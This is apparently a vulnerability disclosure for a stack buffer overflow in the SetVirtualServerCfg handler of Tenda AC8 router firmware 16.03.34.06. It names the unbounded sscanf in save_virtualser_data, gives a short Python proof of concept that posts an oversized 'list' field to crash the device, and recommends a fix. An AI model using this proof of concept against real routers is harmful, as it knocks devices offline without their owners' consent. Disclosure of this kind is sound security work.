# **Tenda AC8 Router (US_AC8V4.0si_V16.03.34.06_cn_TDC01) SetVirtualServerCfg Function - Unbounded sscanf Buffer Overflow**

## **Vulnerability Description**
<img width="1924" height="841" alt="image" src="https://github.com/user-attachments/assets/bfdc601c-5127-485a-9255-ea989e74c7cc" />
A stack overflow vulnerability exists in the `SetVirtualServerCfg` function of the Tenda AC8 router firmware version 16.03.34.06 (updated 2024-11-29). Attackers can exploit this vulnerability to achieve denial of service or remote code execution attacks.

**【Download Link】**
https://www.tenda.com.cn/download/detail-3518.html

**【Update Date】**
2024-11-29

## **Analysis and Verification**

The vulnerability is triggered by passing data through the `list` parameter in the HTTP request body. The vulnerability point is located in the `save_virtualser_data` function.
<img width="749" height="564" alt="image" src="https://github.com/user-attachments/assets/4da9613b-b0cc-41c2-8d96-02378241bff3" />

Within this function, `sscanf` reads data from `v5` and stores it into the `v12`, `v13`, `v14`, and `v15` buffers. Due to the absence of length restrictions, this operation leads to a buffer overflow. The vulnerability was dynamically validated through emulation.
<img width="1308" height="1062" alt="image" src="https://github.com/user-attachments/assets/dc83e28d-e348-4a5e-8e33-04871ba90692" />
<img width="1341" height="171" alt="image" src="https://github.com/user-attachments/assets/fe326f99-ae75-4409-8d4c-9fb2b7fcbf2e" />


## **PoC**

python

```
import requests

url = "http://192.168.67.135/goform/SetVirtualServerCfg"
data = {
    "list": "a" * 512
}
res = requests.post(url=url, data=data)
print(res.content)
```
## **Repair Recommendation**

Restrict the length of bytes read into the buffers.


## **Repair Recommendation**

Restrict the length of bytes read into the buffers.
